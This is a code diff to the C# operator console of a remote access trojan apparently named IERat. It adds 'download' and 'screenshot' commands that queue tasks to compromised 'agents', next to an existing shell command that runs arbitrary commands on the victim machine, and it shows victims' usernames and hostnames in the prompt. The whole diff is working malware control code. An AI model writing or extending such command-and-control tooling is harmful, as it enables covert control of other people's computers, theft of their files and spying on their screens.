@@ -4,12 +4,10 @@ using System.Threading.Tasks;
 using NClap.Metadata;
 using NClap.Repl;
 using IERatServer.lib;
-using Figgle;
 using IERat.lib;
 using NClap.Utilities;
 using System.Drawing;
 using Console = Colorful.Console;
-using Colorful;
 
 namespace IERatServer
 {
@@ -54,7 +52,13 @@ namespace IERatServer
             [Command(typeof(HistoryCommand), Description = "View task history")]
             history,
 
-            [Command(typeof(ExitCommand), Description = "Exits the shell")]
+            [Command(typeof(DownloadCommand), Description = "Download a file")]
+            download,
+
+            [Command(typeof(ScreenshotCommand), Description = "Download a file")]
+            screenshot,
+
+            [Command(typeof(ExitCommand2), Description = "Exits the shell")]
             exit
         }
 
@@ -69,6 +73,24 @@ namespace IERatServer
             }
         }
 
+        class ExitCommand2 : Command
+        {
+            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
+            {
+                Environment.Exit(1);
+                return Task.FromResult(CommandResult.Success);
+            }
+        }
+
+        class ScreenshotCommand : Command
+        {
+            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
+            {
+                AddTaskToActiveAgent("screenshot");
+                return Task.FromResult(CommandResult.Success);
+            }
+        }
+
         class ShellCommand : Command
         {
             [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "a shell command to execute")]
@@ -76,6 +98,17 @@ namespace IERatServer
             public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
             {
                 AddTaskToActiveAgent("shell", shellCommand);
+                return Task.FromResult(CommandResult.Success);
+            }
+        }
+
+        class DownloadCommand : Command
+        {
+            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "the path for the file to download on the remote machine")]
+            public string DownloadPath { get; set; }
+            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
+            {
+                AddTaskToActiveAgent("download", DownloadPath);
                 return Task.FromResult(CommandResult.Success);
             }
         }
@@ -158,6 +191,7 @@ namespace IERatServer
                     Console.WriteLine($"\n---> Interacting with agent #{InteractContext}\n");
                     AgentChannel ActiveChannel = Db.channels.Find(ActiveChannel => ActiveChannel.InteractNum == InteractContext);
                     var agent = ActiveChannel.agent;
+                    Logger.Log("info", $"Interacting with agent {agent.ID}");
                     if (ActiveChannel != null) {
                         loop._client.Prompt = $"({agent.Username}@{agent.Hostname})-[{agent.Cwd}]$ ";
                     }
